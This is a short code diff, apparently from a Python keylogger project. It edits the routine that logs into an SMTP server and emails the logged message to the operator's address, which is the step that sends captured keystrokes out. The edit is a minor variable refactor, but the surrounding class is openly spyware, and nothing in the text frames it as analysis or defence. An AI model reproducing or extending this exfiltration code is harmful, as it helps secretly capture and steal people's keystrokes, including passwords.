@@ -45,8 +45,9 @@ class Keylogger:
         # connect to the SMTP server as TLS mode
         server.starttls()
         try:
-            server.login(self.email, self.password)
-            server.sendmail(self.email, self.email, message)
+            email = self.email
+            server.login(email, self.password)
+            server.sendmail(email, email, message)
         except SMTPAuthenticationError:
             print("Username and Password not accepted.")
         finally:
